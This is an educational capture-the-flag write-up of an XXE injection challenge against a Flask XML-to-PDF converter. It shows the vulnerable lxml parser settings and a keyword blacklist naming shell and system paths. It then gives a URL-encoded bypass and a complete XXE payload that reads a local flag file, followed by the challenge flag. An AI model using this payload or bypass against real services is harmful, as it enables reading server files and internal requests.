---
title: "Pdfile"
summary: "XXE injection with blacklist bypass via URL encoding."
date: 2026-01-31
topics: ["web"]
ctfs: ["pascal-26"]
tags: ["xxe", "xml", "blacklist-bypass"]
difficulty: medium
draft: false
---

> I've recently developed a XML to PDF utility, I'll probably add payments to it soon!

---

The challenge is a Flask web app that converts XML files into PDFs. The `.pasx` extension is just a made-up format for this challenge (probably "Pascal XML" or similar), but it's plain XML underneath.

---

## What is XXE?

XXE (XML External Entity) injection is a vulnerability in XML parsers. To understand it, we need to know about XML entities.

### Entities in XML

XML has a feature called "entities", which are like variables. You define them in a DOCTYPE declaration and reference them with `&name;`:

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ENTITY greeting "Hello, World!">
]>
<note>
  <message>&greeting;</message>
</note>
```

When parsed, `&greeting;` gets replaced with "Hello, World!". This is useful for reusing text or defining special characters.

### External entities

The dangerous part is *external* entities. Instead of defining inline content, you can tell the parser to fetch content from a URI:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

The `SYSTEM` keyword means "fetch this from an external source". The parser will read `/etc/passwd` and substitute its contents wherever `&xxe;` appears. This is XXE.

### Why does this feature exist?

External entities were designed for legitimate use cases like:
- Splitting large documents across multiple files
- Including shared content (like a common header) in multiple documents
- Referencing DTD (Document Type Definition) files for validation

The feature predates modern security concerns. Most XML parsers have it enabled by default for backwards compatibility, which is why XXE is such a common vulnerability.

### What can you do with XXE?

- **Read local files**: `SYSTEM "file:///etc/passwd"`
- **SSRF (Server-Side Request Forgery)**: `SYSTEM "http://internal-server/"`
- **Denial of service**: The "billion laughs" attack uses nested entities to consume memory
- **Port scanning**: Timing differences reveal open ports
- **In some cases, remote code execution**: Via expect:// or other protocol handlers

---

## The vulnerability

The XML parser is configured with external entity resolution enabled:

```python
parser = etree.XMLParser(encoding='utf-8', no_network=False, resolve_entities=True, recover=True)
root = etree.fromstring(xml_content, parser=parser)
```

The `resolve_entities=True` flag tells lxml to actually fetch and substitute external entities. Combined with `no_network=False` (allowing network requests), this parser is fully vulnerable to XXE.

In a secure configuration, you'd use `resolve_entities=False` or at minimum `no_network=True`. Many modern XML libraries disable external entities by default, but lxml wraps libxml2 which has them enabled by default for compatibility with legacy XML documents.

With this configuration, we can define external entities that read files from the filesystem:

```xml
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "/etc/passwd">
]>
```

When the parser encounters `&xxe;`, it will fetch the contents of `/etc/passwd` and substitute them inline.

---

## The blacklist

Before parsing, the app runs a sanitization check:

```python
def sanitize(xml_content):
    content_str = xml_content.decode('utf-8')

    if "&#" in content_str:
        return False

    blacklist = [
        "flag", "etc", "sh", "bash",
        "proc", "pascal", "tmp", "env",
        "bash", "exec", "file", "pascalctf is not fun",
    ]
    if any(a in content_str.lower() for a in blacklist):
        return False
    return True
```

This blocks obvious paths like `/app/flag.txt` or `/etc/passwd` by checking if the raw XML string contains blacklisted words. It also blocks `&#` to prevent XML character entity encoding like `&#102;` for `f`.

---

## The bypass

The blacklist operates on the raw XML string, but the XML parser processes the content differently. Specifically, libxml2 (used by lxml) decodes URL-encoded characters in `SYSTEM` entity paths.

So we can URL-encode the blocked word:

| Original | URL-encoded |
|----------|-------------|
| `flag` | `%66%6C%61%67` |

The Python blacklist sees `%66%6C%61%67` and doesn't match "flag". But when libxml2 resolves the entity path `/app/%66%6C%61%67.txt`, it decodes the percent-encoding and reads `/app/flag.txt`.

---

## Exploit

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "/app/%66%6C%61%67.txt">
]>
<book>
  <title>&xxe;</title>
  <author>x</author>
  <year>2024</year>
  <isbn>000</isbn>
  <chapters>
    <chapter number="1">
      <title>x</title>
      <content>x</content>
    </chapter>
  </chapters>
</book>
```

Upload this as a `.pasx` file, and the generated PDF will contain the flag as the book title.

---

## Flag

```
pascalCTF{xml_t0_pdf_1s_th3_n3xt_b1g_th1ng}
```
